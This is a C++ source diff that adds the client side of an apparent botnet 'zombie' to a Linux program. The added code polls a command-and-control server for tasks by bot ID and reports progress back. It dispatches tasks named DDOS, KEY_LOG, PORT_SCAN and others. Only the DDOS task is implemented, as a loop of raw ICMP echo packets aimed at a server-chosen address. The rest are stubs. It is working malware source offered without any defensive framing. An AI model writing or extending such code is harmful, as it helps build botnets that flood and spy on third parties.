@@ -10,6 +10,8 @@
 #include "linux_functions.h"
 #include <netdb.h>
 #include <fstream>
+#include <thread>
+#include <netinet/ip_icmp.h>
 
 using json = nlohmann::json;
 
@@ -174,4 +176,384 @@ std::string getRAMInfo() {
     }
 
     return ramInfo;
+}
+
+Command beacon(const char* serverIP, int serverPort, Worker worker, Task task) {
+    // Create a socket
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == -1) {
+        std::cerr << "Failed to create socket." << std::endl;
+        return Command();
+    }
+
+    // Set the server address
+    struct sockaddr_in serverAddress;
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
+    serverAddress.sin_port = htons(serverPort);
+
+    // Connect to the server
+    if (connect(sock, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == -1) {
+        std::cerr << "Failed to connect to the server." << std::endl;
+        close(sock);
+        return Command();
+    }
+
+    // Send an HTTP request to the API endpoint
+    int bot_id = worker.id;
+    int task_id = task.id;
+    std::string progress = progressToString(Progress::SUCCESS);
+
+    // Construct the query string
+    std::string queryParams = "bot_id=" + std::to_string(bot_id) + "&task_id=" + std::to_string(task_id) + "&progress=" + progress;
+
+    // Create the HTTP request
+    std::string httpRequest = "GET /zombie/beacon?" + queryParams + " HTTP/1.1\r\n"
+        "Host: " + std::string(serverIP) + "\r\n"
+        "Connection: close\r\n"
+        "Content-Type: application/json\r\n"
+        "\r\n";
+
+    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == -1) {
+        std::cerr << "Failed to send HTTP request." << std::endl;
+        close(sock);
+        return Command();
+    }
+
+    // Receive and process the HTTP response
+    const int receiveBufferSize = 1024;
+    char receiveBuffer[receiveBufferSize];
+
+    std::string response;
+
+    int bytesRead;
+    do {
+        bytesRead = recv(sock, receiveBuffer, receiveBufferSize - 1, 0);
+        if (bytesRead > 0) {
+            receiveBuffer[bytesRead] = '\0';
+            response += receiveBuffer;
+        }
+    } while (bytesRead > 0);
+
+    // Find the start and end of the response data
+    std::string responseData;
+    size_t responseDataStart = response.find("{");
+    size_t responseDataEnd = response.rfind("}");
+    if (responseDataStart != std::string::npos && responseDataEnd != std::string::npos) {
+        responseData = response.substr(responseDataStart, responseDataEnd - responseDataStart + 1);
+    }
+
+    // Print the response data
+    // std::cout << "Received response data:\n" << responseData << std::endl;
+
+    // Parse the JSON response data
+    rapidjson::Document document;
+    document.Parse(responseData.c_str());
+
+    if (document.HasParseError()) {
+        std::cerr << "Failed to parse JSON." << std::endl;
+        close(sock);
+        return Command();
+    }
+
+    Command commandObject = Command::REQUEST;
+
+    if (document.IsObject()) {
+        if (document.HasMember("action") && document["action"].IsString()) {
+            std::string action = document["action"].GetString();
+            // std::cout << "Action: " << action << std::endl;
+
+            if (action == "REQUEST") {
+                commandObject = Command::REQUEST;
+            }
+            else if (action == "CONTINUE") {
+                commandObject = Command::CONTINUE;
+            }
+            else if (action == "STOP") {
+                commandObject = Command::STOP;
+            }
+            else {
+                std::cerr << "Invalid action name: " << action << std::endl;
+            }
+        }
+    }
+
+    // Clean up
+    close(sock);
+    return commandObject;
+}
+
+std::string makeHttpRequest(const char* serverIP, int serverPort, std::string httpRequest) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == -1) {
+        std::cerr << "Failed to create socket." << std::endl;
+        return "0";
+    }
+
+    struct sockaddr_in serverAddress;
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
+    serverAddress.sin_port = htons(serverPort);
+
+    if (connect(sock, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == -1) {
+        std::cerr << "Failed to connect to the server." << std::endl;
+        close(sock);
+        return "0";
+    }
+
+    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == -1) {
+        std::cerr << "Failed to send HTTP request." << std::endl;
+        close(sock);
+        return "0";
+    }
+
+    char buffer[1024]; // Assuming a buffer size of 1024 is sufficient for the response
+
+    int bytesReadResp = recv(sock, buffer, sizeof(buffer) - 1, 0);
+    if (bytesReadResp == -1) {
+        std::cerr << "Failed to receive HTTP response." << std::endl;
+        close(sock);
+        return "0";
+    }
+
+    buffer[bytesReadResp] = '\0';
+    std::string httpResponse(buffer);
+
+    // Clean up
+    close(sock);
+
+    return httpResponse;
+}
+
+std::string extractJSON(std::string json) {
+    size_t firstBrace = json.find_first_of('{');
+    size_t lastBrace = json.find_last_of('}');
+    std::string extractedJSON;
+    if (firstBrace != std::string::npos && lastBrace != std::string::npos && lastBrace > firstBrace) {
+        extractedJSON = json.substr(firstBrace, lastBrace - firstBrace + 1);
+        //std::cout << "Extracted JSON: " << extractedJSON << std::endl;
+    }
+    else {
+        std::cout << "JSON not found in the input string." << std::endl;
+    }
+    return extractedJSON;
+}
+
+Task request(const char* serverIP, int serverPort, Worker worker) {
+    int bot_id = worker.id;
+
+    // Construct the query string
+    std::string queryParams = "bot_id=" + std::to_string(bot_id);
+
+    // Create the HTTP request
+    std::string httpRequest = "GET /zombie/request?" + queryParams + " HTTP/1.1\r\n"
+        "Host: " + std::string(serverIP) + "\r\n"
+        "Connection: close\r\n"
+        "Content-Type: application/json\r\n"
+        "\r\n";
+
+    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest);
+    if (httpResponse.find("HTTP/1.1 204 No Content") != std::string::npos) {
+        std::cerr << "No Tasks available" << std::endl;
+        return Task(); // No need for cleanup on Linux
+    }
+
+    if (httpResponse.find("HTTP/1.1 200 OK") == std::string::npos) {
+        std::cerr << "Unexpected HTTP response status: " << httpResponse << std::endl;
+        return Task(); // No need for cleanup on Linux
+    }
+
+    // Parse the JSON response data
+    std::string extractedJSON = extractJSON(httpResponse);
+
+    rapidjson::Document document;
+    document.Parse(extractedJSON.c_str());
+
+    if (document.HasParseError()) {
+        std::cerr << "Failed to parse JSON." << std::endl;
+        return Task(); // No need for cleanup on Linux
+    }
+
+    Task taskObject = Task();
+
+    if (document.IsObject()) {
+        if (document.HasMember("id") && document["id"].IsInt()) {
+            int id = document["id"].GetInt();
+            std::cout << "ID: " << id << std::endl;
+            taskObject.id = id;
+        }
+
+        if (document.HasMember("task") && document["task"].IsString()) {
+            std::string task = document["task"].GetString();
+            taskObject.task = task;
+        }
+
+        if (document.HasMember("taskParameters") && document["taskParameters"].IsObject()) {
+            const rapidjson::Value& taskParams = document["taskParameters"];
+            if (taskParams.HasMember("address") && taskParams["address"].IsString()) {
+                std::string address = taskParams["address"].GetString();
+                std::cout << "Address: " << address << std::endl;
+                taskObject.taskParams.address = address;
+            }
+
+            if (taskParams.HasMember("interval") && taskParams["interval"].IsInt()) {
+                int interval = taskParams["interval"].GetInt();
+                std::cout << "Interval: " << interval << std::endl;
+                taskObject.taskParams.interval = interval;
+            }
+
+            if (taskParams.HasMember("log") && taskParams["log"].IsBool()) {
+                bool log = taskParams["log"].GetBool();
+                std::cout << "log: " << log << std::endl;
+                taskObject.taskParams.log = log;
+            }
+        }
+    }
+
+    return taskObject;
+}
+
+bool doTask(const char* serverIP, int serverPort, Task task) {
+    TaskOptions tOption = getTaskOption(task.task);
+    bool finishedSuccessfully = false;
+    switch (tOption) {
+    case TaskOptions::DDOS:
+        std::cout << "Processing DDOS task..." << std::endl;
+        // Add DDOS task handling code here
+        finishedSuccessfully = doDDOS(task);;
+        break;
+    case TaskOptions::KEY_LOG:
+        std::cout << "Processing KEY_LOG task..." << std::endl;
+        // Add KEY_LOG task handling code here
+        finishedSuccessfully = true;
+        break;
+    case TaskOptions::PORT_SCAN:
+        std::cout << "Processing PORT_SCAN task..." << std::endl;
+        // Add PORT_SCAN task handling code here
+        finishedSuccessfully = true;
+        break;
+    case TaskOptions::QUACK:
+        std::cout << "Processing QUACK task..." << std::endl;
+        // Add QUACK task handling code here
+        finishedSuccessfully = true;
+        break;
+    case TaskOptions::STORAGE:
+        std::cout << "Processing STORAGE task..." << std::endl;
+        // Add STORAGE task handling code here
+        finishedSuccessfully = true;
+        break;
+    case TaskOptions::UNKNOWN:
+        std::cout << "Unknown task option." << std::endl;
+        // Add code for handling unknown task here
+        finishedSuccessfully = false;
+        break;
+    }
+    return finishedSuccessfully;
+}
+
+void makeHttpDDOSRequest(std::string address, bool log) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == -1) {
+        std::cerr << "Failed to create socket." << std::endl;
+        return;
+    }
+
+    struct sockaddr_in serverAddress;
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_addr.s_addr = inet_addr(address.c_str());
+    serverAddress.sin_port = htons(8080);
+
+    if (connect(sock, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == -1) {
+        std::cerr << "Failed to connect to the server." << std::endl;
+        close(sock);
+        return;
+    }
+
+    std::string httpRequest = "GET / HTTP/1.1\r\n"
+        "Host: " + address + "\r\n"
+        "Connection: close\r\n"
+        "Content-Type: application/json\r\n"
+        "\r\n";
+
+    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == -1) {
+        std::cerr << "Failed to send HTTP request." << std::endl;
+        close(sock);
+        return;
+    }
+
+    if (log) {
+        char buffer[1024];
+        int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (bytesRead == -1) {
+            std::cerr << "Failed to receive response." << std::endl;
+        }
+        else if (bytesRead > 0) {
+            buffer[bytesRead] = '\0';
+            std::string response(buffer);
+            std::cout << "Received response: " << response << std::endl;
+        }
+        else {
+            std::cerr << "No response received." << std::endl;
+        }
+    }
+
+    // Clean up
+    close(sock);
+}
+
+bool doDDOS(Task task) {
+    std::string address = task.taskParams.address;
+    int interval = task.taskParams.interval;
+
+
+    for (int i = 0; i < interval; ++i) {
+        sendPing(address.c_str());
+    }
+
+    return true;
+}
+
+unsigned short checksum(unsigned short* buf, int len) {
+    unsigned long sum = 0;
+    while (len > 1) {
+        sum += *buf++;
+        len -= 2;
+    }
+    if (len == 1) {
+        sum += *(unsigned char*)buf;
+    }
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    return (unsigned short)(~sum);
+}
+
+void sendPing(const char *address) {
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (sockfd < 0) {
+        perror("socket");
+        return;
+    }
+
+    struct sockaddr_in dest_addr;
+    memset(&dest_addr, 0, sizeof(struct sockaddr_in));
+    dest_addr.sin_family = AF_INET;
+    inet_pton(AF_INET, address, &dest_addr.sin_addr);
+
+    char packet[64];  // ICMP packet with 64 bytes (standard ping size)
+
+    struct icmphdr* icmp = (struct icmphdr*)packet;
+    icmp->type = ICMP_ECHO;
+    icmp->code = 0;
+    icmp->un.echo.id = getpid();
+    icmp->un.echo.sequence = 0;
+    icmp->checksum = 0;
+    icmp->checksum = checksum((unsigned short*)icmp, sizeof(struct icmphdr));
+
+    if (sendto(sockfd, &icmp, sizeof(struct icmphdr), 0, (struct sockaddr*)&dest_addr, sizeof(struct sockaddr_in)) < 0) {
+        perror("sendto");
+        close(sockfd);
+        return;
+    }
+
+    close(sockfd);
 }
